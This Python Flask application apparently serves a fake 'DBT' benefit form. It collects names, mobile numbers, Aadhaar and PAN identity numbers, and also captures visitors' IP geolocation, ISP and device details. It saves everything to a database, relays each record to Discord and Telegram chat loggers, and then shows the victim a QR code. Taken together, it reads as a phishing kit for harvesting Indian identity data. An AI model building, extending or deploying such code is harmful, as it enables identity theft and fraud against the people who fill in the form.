import os
from flask import Flask, request, render_template
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate  # <-- 1. ADD THIS LINE
from datetime import datetime
from zoneinfo import ZoneInfo

# Import your functions
from discord_logger import log_to_discord
from telegram_logger import log_to_telegram
from ip_utils import get_ip_info, get_device_info

# Initialize SQLAlchemy
db = SQLAlchemy()

# --- Database Models ---
class Submission(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    timestamp = db.Column(db.DateTime, default=lambda: datetime.now(ZoneInfo('Asia/Kolkata')))
    name = db.Column(db.String(150), nullable=False)
    mobile = db.Column(db.String(15), nullable=False)
    aadhar = db.Column(db.String(12), nullable=False)
    pan = db.Column(db.String(10), nullable=False)
    ip_address = db.Column(db.String(45))
    user_agent = db.Column(db.Text)
    ip_city = db.Column(db.String(100), nullable=True)
    ip_region = db.Column(db.String(100), nullable=True)
    ip_country = db.Column(db.String(100), nullable=True)
    ip_org = db.Column(db.String(200), nullable=True)


def create_app():
    """Application Factory Function"""
    app = Flask(__name__)

    # --- Configuration ---
    app.config.from_pyfile('config.py')
    basedir = os.path.abspath(os.path.dirname(__file__))
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(basedir, 'submissions.db')
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

    # Initialize extensions
    db.init_app(app)
    migrate = Migrate(app, db)  # <-- 2. ADD THIS LINE

    # --- Routes ---
    @app.route('/', methods=['GET', 'POST'])
    def home():
        if request.method == 'POST':
            from tasks import log_submission_task
            # ... (rest of your POST logic) ...
            ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
            info = get_ip_info(ip)
            device = get_device_info(request)
            
            new_submission = Submission(
                name=request.form.get('name'),
                mobile=request.form.get('mobile'),
                aadhar=request.form.get('aadhar'),
                pan=request.form.get('pan'),
                ip_address=ip,
                user_agent=device['user_agent'],
                ip_city=info.get('city'),
                ip_region=info.get('region'),
                ip_country=info.get('country'),
                ip_org=info.get('org')
            )
            db.session.add(new_submission)
            db.session.commit()

            now = datetime.now(ZoneInfo('Asia/Kolkata')).strftime('%Y-%m-%d %H:%M:%S')
            log_msg = f"""📥 DBT FORM SUBMISSION
            👤 Name: {request.form.get('name')}
            📱 Mobile: {request.form.get('mobile')}
            🆔 Aadhar: {request.form.get('aadhar')}
            💳 PAN: {request.form.get('pan')}
            ---
            🌍 IP: {ip} ({info.get('city')}, {info.get('region')}, {info.get('country')})
            🏢 ISP: {info.get('org')}
            📲 Device: {device['user_agent']}
            🕒 Time: {now}"""
            
            log_submission_task.delay(log_msg)
            
            return render_template('index.html', show_qr=True)

        return render_template('index.html', show_qr=False)

    return app
